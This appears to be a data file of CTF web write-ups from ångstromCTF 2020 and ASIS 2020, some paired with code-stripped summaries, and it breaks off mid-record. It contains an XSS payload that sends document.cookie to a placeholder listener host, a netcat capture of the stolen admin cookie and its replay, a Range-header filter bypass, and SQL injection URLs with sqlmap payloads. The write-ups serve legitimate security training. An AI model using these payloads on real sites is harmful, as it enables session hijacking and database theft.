Decoding the Base64 cookie value will give you the flag"
"# ångstromCTF 2020 – Woooosh

* **Category:** web
* **Points:** 130

## Challenge

> Clam's tired of people hacking his sites so he spammed obfuscation on his new game. I have a feeling that behind that wall of obfuscated javascript there's still a vulnerable site though. Can you get enough points to get the flag? I also found the backend source.
> 
> Author: aplet123
> 
> Hint: The frontend is obfuscated but maybe something else isn't?

## Solution

The website is a game where you have to click on the circle and don't click on the squares, both located on random positions each round. You have to click more than 20 times in 10 seconds.

```html
<!doctype html>
<html lang=""en"">
    <head>
        <meta charset=""utf-8"">
        <meta name=""viewport"" content=""width=device-width, initial-scale=1, shrink-to-fit=no"">
    
        <link href=""https://fonts.googleapis.com/css?family=Inter&display=swap"" rel=""stylesheet"">
        <link rel=""stylesheet"" href=""/style.css"">
    
        <title>Woooosh</title>

        <script src=""/socket.io/socket.io.js""></script>
    </head>
    <body>
        <h1>The Greatest Game of All Time</h1>
<p>If I aggressively obfuscate the frontend then my code is secure, right?</p>
<p id=""pScore"">To play, just click on the circle and don't click on the square.</p>
<button id=""bStart"">Start game</button>
<canvas id=""cGame"" width=""500"" height=""300""></canvas>
<script src=""main.js""></script>
    </body>
</html>
```

The [frontend source](main.js) is heavily obfuscated, but the challenge gives you the [backend source](index.js).

```javascript
const express = require(""express"");
const exphbs = require(""express-handlebars"");
const socket = require(""socket.io"");
const path = require(""path"");
const http = require(""http"");
const morgan = require(""morgan"");

const app = express();
const serv = http.createServer(app);
const io = socket.listen(serv);
const port = process.env.PORT || 60600;

function rand(bound) {
    return Math.floor(Math.random() * bound);
}

function genId() {
    const chars = ""abcdefghijklmnopqrstuvwxyz0123456789"";
    return new Array(64).fill(0).map(v => chars[rand(chars.length)]).join``;
}

function genShapes() {
    return new Array(20).fill(0).map(v => ({ x: rand(500), y: rand(300) }));
}

function dist(a, b, c, d) {
    return Math.sqrt(Math.pow(c - a, 2), Math.pow(d - b, 2));
}

app.use(morgan(""combined""));

app.use(express.static(path.join(__dirname, ""public"")));

const hbs = exphbs.create({
    extname: "".hbs"",
    helpers: {}
});

app.engine(""hbs"", hbs.engine);
app.set(""view engine"", ""hbs"");
app.set(""views"", path.join(__dirname, ""views""));

io.on(""connection"", client => {
    let game;
    setTimeout(function() {
        try {
            client.disconnect();
        } catch (err) {
            console.log(""err"", err);
        }
    }, 1 * 60 * 1000);
    function endGame() {
        try {
            if (game) {
                if (game.score > 20) {
                    client.emit(
                        ""disp"",
                        `Good job! You're so good at this! The flag is ${process.env.FLAG}!`
                    );
                } else {
                    client.emit(
                        ""disp"",
                        ""Wow you're terrible at this! No flag for you!""
                    );
                }
                game = null;
            }
        } catch (err) {
            console.log(""err"", err);
        }
    }
    client.on(""start"", function() {
        try {
            if (game) {
                client.emit(""disp"", ""Game already started."");
            } else {
                game = {
                    shapes: genShapes(),
                    score: 0
                };
                game.int = setTimeout(endGame, 10000);
                client.emit(""shapes"", game.shapes);
                client.emit(""score"", 0);
            }
        } catch (err) {
            console.log(""err"", err);
        }
    });
    client.on(""click"", function(x, y) {
        try {
            if (!game) {
                return;
            }
            if (typeof x != ""number"" || typeof y != ""number"") {
                return;
            }
            if (dist(game.shapes[0].x, game.shapes[1].y, x, y) < 10) {
                game.score++;
            }
            game.shapes = genShapes();
            client.emit(""shapes"", game.shapes);
            client.emit(""score"", game.score);
        } catch (err) {
            console.log(""err"", err);
        }
    });
    client.on(""disconnect"", function() {
        try {
            if (game) {
                clearTimeout(game.int);
            }
            game = null;
        } catch (err) {
            console.log(""err"", err);
        }
    });
});

app.get(""/"", function(req, res) {
    res.render(""home"");
});

serv.listen(port, function() {
    console.log(`Server listening on port ${port}!`);
});
```

From this source code you can discover that positions are sent to the client into a JSON array and that the winning position is the first one sent.

Analyzing the HTTP traffic you can discover the format of each request/response packet and you can use this information to develop [your own client](solver-woooosh.py) able to win each round of the game.

```python
#!/usr/bin/python

import requests
import time
import math

verbose = True

target_site = ""https://wooooosh.2020.chall.actf.co/""
target_endpoint_without_sid = target_site + ""socket.io/?EIO=3&transport=polling&t={}""
target_endpoint = target_endpoint_without_sid + ""&sid={}""
headers = {
   ""User-Agent"": ""Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);"", 
   ""Content-Type"": ""text/plain;charset=UTF-8"",
   ""Accept-Encoding"": ""gzip, deflate, br"",
   ""Origin"": ""https://wooooosh.2020.chall.actf.co"",
   ""Referer"": ""https://wooooosh.2020.chall.actf.co/"",
}

def log_message(message):
    if verbose:
        print(message)


def log_data(answer):
    if verbose:
        print(""-----------------------------------"")
        print(answer)
        print(""-----------------------------------"")


def get_sid_from_cookies(cookies):
    sid = None
    #log_message(""[*] Cookies:"")
    for cookie in cookies:
        #log_message(""[*]   - {}={}"".format(cookie.name, cookie.value))
        if cookie.name == ""io"":
            sid = cookie.value
            #log_message(""[*] Found sid: {}."".format(sid))
    return sid


def generate_t_param():
    timestamp = int(round(time.time() * 1000))
    return yeast_encode(timestamp)


# https://github.com/unshiftio/yeast/blob/28d15f72fc5a4273592bc209056c328a54e2b522/index.jsL17
def yeast_encode(num):
    alphabet = list(""0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_"")
    length = len(alphabet)
    encoded = """"
    
    while True:
        encoded = alphabet[num % length] + encoded
        num = math.floor(num / length)
        if num <= 0:
            break
    
    return encoded


def generate_payload(payload):
    return ""{}:{}"".format(str(len(payload)), payload)


def generate_start_payload():
    start_payload = generate_payload(""42[\""start\""]"")
    #log_data(start_payload)
    return start_payload


def generate_answer_payload(x, y):
    answer_payload = generate_payload(""42[\""click\"",{},{}]"".format(x, y))
    #log_data(answer_payload)
    return answer_payload


t = generate_t_param()
url = target_endpoint_without_sid.format(t)
#log_message(""[*] Getting sid. {}"".format(url))
r = requests.get(url, headers=headers)
cookies = r.cookies
#log_data(r.text)
sid = get_sid_from_cookies(cookies)

t = generate_t_param()
url = target_endpoint.format(t, sid)
#log_message(""[*] Starting the game. {}"".format(url))
r = requests.post(url, headers=headers, cookies=cookies, data=generate_start_payload())
cookies = r.cookies
#log_data(r.text)

#log_message(""[*] Playing the game."")
score = """"
start_time = int(round(time.time() * 1000))
bad_gateway_retries = 0
while True:

    while True:
        t = generate_t_param()
        url = target_endpoint.format(t, sid)
        #log_message(""[*] Polling. {}"".format(url))
        r = requests.get(url, headers=headers, cookies=cookies)
        cookies = r.cookies
        content = r.text
        #log_data(content)
    
        if r.status_code == 502:
            bad_gateway_retries += 1
            t = generate_t_param()
            url = target_endpoint_without_sid.format(t)
            #log_message(""[*] Getting sid. {}"".format(url))
            r = requests.get(url, headers=headers)
            cookies = r.cookies
            #log_data(r.text)
            sid = get_sid_from_cookies(cookies)
        else:
            break
    
    if ""actf{"" in content:
        print(""                                         "")
        print(""[*] ====================================="")
        print(""[*] ====================================="")
        print(""[*] ====================================="")
        print(""[*] vvvvvvvvvvvv FLAG FOUND! vvvvvvvvvvvv"")
        print(""                                         "")
        print(content)
        print(""                                         "")
        print(""[*] ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"")
        print(""[*] ====================================="")
        print(""[*] ====================================="")
        print(""[*] ====================================="")
        print(""                                         "")
        break
    elif ""terrible"" in content or ""disconnected"" in content:
        end_time = int(round(time.time() * 1000))
        total_time = (end_time - start_time) / 1000
        print(""[*] FAILED! Score: {} ({} secs, {} 502 retries)"".format(score, str(total_time), str(bad_gateway_retries)))
        break
    elif ""shapes"" in content:
        #log_message(""[*][shapes] Response intercepted."")
        coordinates = content[21:34].replace(""{"", """").replace(""}"", """").replace(""["", """").replace(""]"", """").replace(""\"""", """").replace(""x"", """").replace(""y"", """").replace("":"", """")
        best_x = coordinates.split("","")[0]
        best_y = coordinates.split("","")[1]
        #log_message(""[*][shapes] The best position is at {}, {}."".format(best_x, best_y))
        if ""score"" in content:
            score = content[-5:-1].replace(""]"", """").replace("","", """").replace(""\"""", """").replace(""e"", """")
            #log_message(""[*][shapes] Score: {}."".format(score))
        t = generate_t_param()
        url = target_endpoint.format(t, sid)
        #log_message(""[*] Send answer. {}"".format(url))
        r = requests.post(url, headers=headers, cookies=cookies, data=generate_answer_payload(best_x, best_y))
        cookies = r.cookies
        content = r.text
        #log_data(content)
    elif ""score"" in content:
        #log_message(""[*][score] Response intercepted."")
        score = content[-5:-1].replace(""]"", """").replace("","", """").replace(""\"""", """").replace(""e"", """")
        #log_message(""[*][score] Score: {}."".format(score))
```

The flag is the following.

```
actf{w0000sh_1s_th3_s0und_0f_th3_r3qu3st_fly1ng_p4st_th3_fr0nt3nd}
```","The website is a game where you have to click on the circle and don't click on the squares, both located on random positions each round. You have to click more than 20 times in 10 seconds.

[HTML code defining the structure and content of a web page, including links to external CSS and JavaScript files, and a canvas element.]

The [frontend source](main.js) is heavily obfuscated, but the challenge gives you the [backend source](index.js).

[Node.js server-side JavaScript code that creates an HTTP server using the Express.js library, which serves an HTML page containing a game. The game involves clicking on shapes that are randomly generated on the page, with the objective of earning a score greater than 20 within a 10-second time limit. If the player's score is high enough, the server will emit a message containing the flag.]

From this source code you can discover that positions are sent to the client into a JSON array and that the winning position is the first one sent.

Analyzing the HTTP traffic you can discover the format of each request/response packet and you can use this information to develop [your own client](solver-woooosh.py) able to win each round of the game.

[Python script that plays a game through a website's API. The game is identified by a URL stored in the ""target_site"" variable. The script communicates with the API through HTTP requests, sending and receiving data in JSON format. The script uses the ""requests"" library to send HTTP requests and the ""time"" and ""math"" libraries to generate timestamps and perform arithmetic operations, respectively.]

The flag is the following."
"# ångstromCTF 2020 – Xmas Still Stands

* **Category:** web
* **Points:** 50

## Challenge

> You remember when I said I dropped clam's tables? Well that was on Xmas day. And because I ruined his Xmas, he created the Anti Xmas Warriors to try to ruin everybody's Xmas. Despite his best efforts, Xmas Still Stands. But, he did manage to get a flag and put it on his site. Can you get it?
> 
> Author: aplet123
> 
> https://xmas.2020.chall.actf.co/

## Solution

The title reminds the XSS vulnerability.

The `https://xmas.2020.chall.actf.co/post` page can be used to post a message with an XSS attack. For example using an `img` tag like the following.

```html
<img src=""foo.png"" onerror=""document.location='http://x.x.x.x:1337?c='+document.cookie;"" />
```

The website will return a code that can be used to identify the posted message.

The resulting code can be sent to administrator via `https://xmas.2020.chall.actf.co/report` page.

On a server listening with `nc`, you will receive the admin cookies.

```
ubuntu@server:~$ nc -lvp 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from ec2-52-207-14-64.compute-1.amazonaws.com 48884 received!
GET /?c=super_secret_admin_cookie=hello_yes_i_am_admin;%20admin_name=Jamie HTTP/1.1
Host: x.x.x.x:1337
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Jamie's browser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://127.0.0.1:3000/posts/642
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Then the cookie can be used to perform a request to `https://xmas.2020.chall.actf.co/admin` page.

```
GET /admin HTTP/1.1
Host: xmas.2020.chall.actf.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: super_secret_admin_cookie=hello_yes_i_am_admin;%20admin_name=Jamie
Referer: https://xmas.2020.chall.actf.co/admin
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Content-Length: 2905
Content-Type: text/html; charset=utf-8
Date: Mon, 16 Mar 2020 00:07:35 GMT
Etag: W/""b59-k/yKe0HiO0ZF+89xBSA/dXuyjnQ""
Server: Caddy
Server: nginx/1.14.1
X-Powered-By: Express
Connection: close

<!doctype html>
<html lang=""en"">
    <head>
        <meta charset=""utf-8"">
        <meta name=""viewport"" content=""width=device-width, initial-scale=1, shrink-to-fit=no"">
    
        <link rel=""stylesheet"" href=""/bootstrap.css"">
        <link rel=""stylesheet"" href=""/style.css"">
    
        <title>Anti-Xmas Warriors</title>
    
        <script defer src=""https://code.jquery.com/jquery-3.3.1.slim.min.js"" integrity=""sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"" crossorigin=""anonymous""></script>
        <script defer src=""https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"" integrity=""sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"" crossorigin=""anonymous""></script>
        <script defer src=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"" integrity=""sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"" crossorigin=""anonymous""></script>
    </head>
    <body>
        <nav class=""navbar navbar-expand-lg navbar-dark bg-primary"">
            <a class=""navbar-brand"" href=""/"">Anti-Xmas Warriors</a>
            <button class=""navbar-toggler"" type=""button"" data-toggle=""collapse"" data-target=""#navbarSupportedContent"" aria-controls=""navbarSupportedContent"" aria-expanded=""false"" aria-label=""Toggle navigation"">
                <span class=""navbar-toggler-icon""></span>
            </button>
            
            <div class=""collapse navbar-collapse"" id=""navbarSupportedContent"">
                <ul class=""navbar-nav mr-auto"">
                    <li class=""nav-item"">
                        <a class=""nav-link"" href=""/"">Home</a>
                    </li>
                    <li class=""nav-item"">
                        <a class=""nav-link"" href=""/post"">Post</a>
                    </li>
                    <li class=""nav-item"">
                        <a class=""nav-link"" href=""/report"">Report</a>
                    </li>
                    <li class=""nav-item"">
                        <a class=""nav-link"" href=""/admin"">Admin</a>
                    </li>
                </ul>
            </div>
        </nav>        <div class=""container mx-auto text-center partial-width pt-2"">
    <h1 class=""display-4"">Admin Landing Page</h1>
    <p>Hey admins, you may have noticed that we've changed things up a bit. There's no longer any cumbersome, bruteforceable login system. All you need is the secret cookie verifying that you're an admin and you can get the flag anytime you want. Also, if you're not an admin PLEASE LEAVE THIS PAGE YOU DON'T BELONG HERE AND I WILL HUNT YOU DOWN AND RUIN YOUR DAY IF YOU STAY HERE. Disclaimer: I will not actually hunt you down or physically hurt you in any way, shape, or form, please don't sue me thanks.</p>
        <p>Oh hey admin! The flag is actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}.</p>
</div>
    </body>
</html>
```

The flag is the following.

```
actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}
```","The title reminds the XSS vulnerability.

The page can be used to post a message with an XSS attack. For example using an `img` tag like the following.

[HTML code for an image element with a ""src"" attribute pointing to ""foo.png"". The ""onerror"" attribute is set to execute JavaScript code that redirects the user to a specific URL while appending the document's cookie as a parameter.]

The website will return a code that can be used to identify the posted message.

The resulting code can be sent to administrator via the report page.

On a server listening with `nc`, you will receive the admin cookies.

[Terminal output showing a network connection being established and a GET request being made with various HTTP headers and parameters.]

Then the cookie can be used to perform a request to the admin page.

[HTTP request and response headers and body for a web page. The response body contains HTML code for an admin landing page with a secret cookie authentication system.]

The flag is the following."
"# ASIS CTF Finals 2020 – Less secure secrets

* **Category:** web
* **Points:** 71

## Challenge

> Let's warm up!
> 
> https://securesecrets.asisctf.com/

## Solution

The website shows a page like the following.

```html
<html>
    <head>
        <title>Secret protector</title>        
        <link href=""https://fonts.googleapis.com/css2?family=Chilanka&display=swap"" rel=""stylesheet"">
        <style>
            body{
                background-color: #262428;
            }
            .title-protection{
                font-family: ""Chilanka"";
                font-size: 40px;
                font-weight: bold;
                color: white;
                width: 100%;
                text-align: center;
                height: 400px;
                line-height: 400px;
            }
            iframe{
                width: 400px;
                height: 300px;
                margin-top: -50px;
            }
            .frame-holder{
                text-align: center;
                width: 100%;
            }
        </style>
    </head>
    <body>
        <div>
            <div class=""title-protection"">
                Apache powered secret protection. Secure your secrets, with our sample <a href=""configs.zip"">configs</a>.
            </div>
            <div class=""frame-holder"">
                <iframe src=""/secret.html"">
                </iframe>
            </div>
            <div>
                
            </div>
        </div>
    </body>
</html>
```

You can discover the [configs.zip](configs.zip) file with configurations.

Analyzing [`configs/config/proxy/apache_ctf.conf`](configs/config/proxy/apache_ctf.conf) file, you can find a rule that substitute a `secret` tag.

```
ServerName proxy

LoadModule deflate_module /usr/local/apache2/modules/mod_deflate.so
LoadModule proxy_module /usr/local/apache2/modules/mod_proxy.so
LoadModule substitute_module /usr/local/apache2/modules/mod_substitute.so
LoadModule proxy_http_module /usr/local/apache2/modules/mod_proxy_http.so

<VirtualHost *:80>
    RequestHeader unset Accept-Encoding
    ProxyPass / http://main/
    ProxyPassReverse / http://main/

    SetEnvIf X-Http-Method-Override "".+"" X-Http-Method-Override=$0
    RequestHeader set X-Http-Method-Override %{X-Http-Method-Override}e env=X-Http-Method-Override

    SetEnvIf Range "".+"" Range=$0
    RequestHeader set Range %{Range}e env=Range

    SetEnvIf Via "".+"" Via=$0
    RequestHeader set Via %{Via}e env=Via

    SetEnvIf If-Match "".+"" If-Match=$0
    RequestHeader set If-Match %{If-Match}e env=If-Match

    <if ""%{REMOTE_ADDR} != '127.0.0.1'"">
        AddOutputFilterByType INFLATE;SUBSTITUTE;DEFLATE text/html
        Substitute s|<secret>(.*)</secret>|Protected|i
    </if>
    
    # Send apache logs to stdout and stderr
    CustomLog /proc/self/fd/1 common
    ErrorLog /proc/self/fd/2
</VirtualHost>
```

So if you try to read `secret.html` page you will obtain the content with the substitution applied.

```
GET /secret.html HTTP/1.1
Host: securesecrets.asisctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://securesecrets.asisctf.com/
Connection: close


HTTP/1.1 200 OK
date: Fri, 11 Dec 2020 23:23:18 GMT
server: Apache/2.4.46 (Unix)
last-modified: Fri, 11 Dec 2020 14:56:25 GMT
etag: ""36b-5b6317f19aaf3""
accept-ranges: bytes
content-type: text/html
vary: Accept-Encoding
connection: close
Content-Length: 792

<html>
    <head>
        <title>very secure key</title>        
        <link href=""https://fonts.googleapis.com/css2?family=Chilanka&display=swap"" rel=""stylesheet"">
        <style>
            body{
                background-color:	#2e2e2e;
            }
            .title-protection{
                font-family: ""Chilanka"";
                font-size: 20px;
                font-weight: bold;
                color: white;
                width: 100%;
                padding: 40px 100px;
                box-sizing: border-box;
                text-align: center;
                height: 400px;
            }
        </style>
    </head>
    <body>
        <div>
            <div class=""title-protection"">
                Protected
            </div>
        </div>
    </body>
</html>
```

You can use the `Range` HTTP header to exfiltrate the original `secret.html` page.

```
GET /secret.html HTTP/1.1
Host: securesecrets.asisctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://securesecrets.asisctf.com/
Connection: close
Range: bytes=0-1023


HTTP/1.1 206 Partial Content
date: Fri, 11 Dec 2020 23:25:00 GMT
server: Apache/2.4.46 (Unix)
last-modified: Fri, 11 Dec 2020 14:56:25 GMT
etag: ""36b-5b6317f19aaf3""
accept-ranges: bytes
content-length: 875
content-range: bytes 0-874/875
content-type: text/html
connection: close

<html>
    <head>
        <title>very secure key</title>        
        <link href=""https://fonts.googleapis.com/css2?family=Chilanka&display=swap"" rel=""stylesheet"">
        <style>
            body{
                background-color:	#2e2e2e;
            }
            .title-protection{
                font-family: ""Chilanka"";
                font-size: 20px;
                font-weight: bold;
                color: white;
                width: 100%;
                padding: 40px 100px;
                box-sizing: border-box;
                text-align: center;
                height: 400px;
            }
        </style>
    </head>
    <body>
        <div>
            <div class=""title-protection"">
                <secret>What??? You want the first secret? I think it's ""ASIS{L3T5_S74rT_7h3_fUn}"".</secret>
            </div>
        </div>
    </body>
</html>
```

The flag is the following.

```
ASIS{L3T5_S74rT_7h3_fUn}
```","The website shows a page like the following.

[HTML code for a webpage that includes an iframe that loads the content of another page (""/secret.html"") within the current page.]

You can discover the config.zip file with configurations.

Analyzing apache_ctf.conf file, you can find a rule that substitute a `secret` tag.

[Apache configuration for a reverse proxy server that listens on port 80, passes incoming requests to a backend server named ""main"", and applies some filters and substitutions to the server's responses. Also includes directives for setting request headers, logging, and error handling.]

So if you try to read `secret.html` page you will obtain the content with the substitution applied.

[HTTP request and response for a web page. The  response contains HTML code for a webpage that displays the text ""Protected"".]

You can use the `Range` HTTP header to exfiltrate the original `secret.html` page and get the flag."
"## Treasury 1

* **Category:** web
* **Points:** 47

### Challenge

> A Cultural Treasury
> 
> https://poems.asisctf.com/

### Solution

The website contains a list of books with two actions available:
* *an excerpt* to read an excerpt of the book;
* *read online* which opens a link from another domain, not related to the challenge.

Analyzing the HTML source of the page a [treasury.js](treasury.js) file can be found; it is interesting to understand performed calls.

```javascript
async function anexcerpt(book) {
  const modalEl = document.createElement('div');
  modalEl.style.width = '70%';
  modalEl.style.height = '50%';
  modalEl.style.margin = '100px auto';
  modalEl.style.backgroundColor = '#fff';
  modalEl.className = 'mui-panel';
  const header = document.createElement('h2');
  header.appendChild(document.createTextNode(""An Excerpt From "" + book.name));
  modalEl.appendChild(header);
  const loading = createSpinner(modalEl);
  // show modal
  mui.overlay('on', modalEl);

  const response = await fetch('books.php?type=excerpt&id=' + book.id);
  const bookExcerpt = await response.text();
  const txtHolder = document.createElement('div');
  txtHolder.className = 'mui-textfield mui--z2'
  const txt = document.createElement('textarea');
  txt.appendChild(document.createTextNode(bookExcerpt));
  txt.readOnly = true;
  txt.style.height = ""100%"";
  txtHolder.appendChild(txt);
  txtHolder.style.height = ""70%"";
  loading.stop();
  modalEl.appendChild(txtHolder);
}

function readonline(book) {
  window.open(book.link);
}
```

The home page is created with the following request.

```
GET /books.php?type=list HTTP/1.1
Host: poems.asisctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://poems.asisctf.com/
Connection: close

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 03 Jul 2020 21:39:04 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.7
Content-Length: 604

[{""id"":""1"",""name"":""D\u012bv\u0101n of Hafez"",""author"":""Khw\u0101ja Shams-ud-D\u012bn Mu\u1e25ammad \u1e24\u0101fe\u1e93-e Sh\u012br\u0101z\u012b"",""year"":""1315-1390"",""link"":""https:\/\/ganjoor.net\/hafez\/ghazal\/sh255\/""},{""id"":""2"",""name"":""Gulistan of Saadi"",""author"":""Ab\u016b-Muhammad Muslih al-D\u012bn bin Abdall\u0101h Sh\u012br\u0101z\u012b, the Saadi"",""year"":""1258"",""link"":""https:\/\/ganjoor.net\/saadi\/golestan\/gbab1\/sh36\/""},{""id"":""3"",""name"":""Shahnameh of Ferdowsi"",""author"":""Abul-Q\u00e2sem Ferdowsi Tusi"",""year"":""977-1010"",""link"":""https:\/\/ganjoor.net\/ferdousi\/shahname\/jamshid\/sh1\/""}]
```

The excerpt button performs a request like the following.

```
GET /books.php?type=excerpt&id=1 HTTP/1.1
Host: poems.asisctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://poems.asisctf.com/
Connection: close

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 03 Jul 2020 21:42:14 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.7
Content-Length: 1043

Joseph will come back to Canaan again, 
My house the fragrance of her rose-garden will regain.

0 sad heart, from hardships do not get mad,
Your worries will soon end- don’t feel so sad.

If the Spring on turf-throne would remain,
The bird under flower-canopy sits again.
 
If the world turns to your favor some days,
Take it easy; it won’t do so always.
 
If God’s secrets are unknown don’t despair.
Behind the mystery-curtain is a love-affair.
 
O’Heart, if death-flood sweeps off all life,
Your pilot as Noah, ends your strife.
 
When through desert you pass for pilgrimage,
If thorns bother your feet, don’t be in rage.

The road’s perilous and destination away.
Yet all roads have their ends, I daresay.
 
Enemies oppose me in absence of friend,
God knows that on Him I only depend.

Hafiz, the dark, lonely nights never mind, 
Study and pray- thus salvation you find.

Translator:
Kashani, A. A.  (1984).  Odes of Hafiz: Poetical horoscope. (pp. 182) Lexington: Mazda Publishers.
http://www.thesongsofhafiz.com/kashani1.htm
```

The read online button simply opens a window redirecting to the link specified for the book.

A URL like the following will reveal that web application is vulnerable to SQL injection, because the result of the book with `id=1` will be printed.

```
https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20or%20id=%271
```

The following URL will spawn a weird error.

```
https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%201%20%23



Warning: simplexml_load_string(): Entity: line 1: parser error : Start tag expected, '<' not found in /code/books.php on line 54

Warning: simplexml_load_string(): 1 in /code/books.php on line 54

Warning: simplexml_load_string(): ^ in /code/books.php on line 54
```

It seems that the web application reads XML from a database.

You could use `sqlmap` to retrieve information.

```
user@host:~$ sqlmap -u ""https://poems.asisctf.com/books.php?type=excerpt&id=1"" -p id --delay 3 --dbms=mysql
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 23:59:52

[23:59:52] [INFO] testing connection to the target URL
[23:59:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[00:00:02] [INFO] testing if the target URL content is stable
[00:00:06] [INFO] target URL content is stable
[00:00:11] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[00:00:15] [INFO] testing for SQL injection on GET parameter 'id'
[00:00:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:01:05] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[00:01:05] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:01:10] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[00:01:10] [INFO] testing 'MySQL inline queries'
[00:01:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[00:01:14] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
[00:02:46] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[00:03:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:03:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:03:37] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[00:04:04] [INFO] target URL appears to have 1 column in query
[00:04:18] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 43 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: type=excerpt&id=1' AND 5495=5495 AND 'iTDE'='iTDE

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: type=excerpt&id=1' AND SLEEP(5) AND 'ARUQ'='ARUQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: type=excerpt&id=-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)-- eqPZ
---
[00:04:45] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7
back-end DBMS: MySQL >= 5.0.12
[00:04:45] [INFO] fetched data logged to text files under '/home/ubuntu/.sqlmap/output/poems.asisctf.com'

[*] shutting down at 00:04:45

user@host:~$ sqlmap -u ""https://poems.asisctf.com/books.php?type=excerpt&id=1"" -p id --delay 3 --dbms=mysql --dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:05:09

[00:05:10] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: type=excerpt&id=1' AND 5495=5495 AND 'iTDE'='iTDE

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
